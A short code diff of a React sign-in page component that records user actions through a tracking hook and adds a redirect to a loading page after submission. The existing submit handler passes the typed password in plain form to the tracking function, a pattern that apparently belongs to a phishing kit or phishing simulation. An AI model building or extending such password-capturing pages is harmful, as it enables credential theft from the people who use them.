@@ -278,7 +278,8 @@ ${GE_SHELL_CSS}
 `;
 
 function GePasswordPage() {
-  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
+  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
+    useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -343,6 +344,7 @@ function GePasswordPage() {
     if (!canContinue) return;
     trackClick("Next");
     trackSubmit("password", password);
+    geNavigate("/ge/loading");
   };
 
   return (
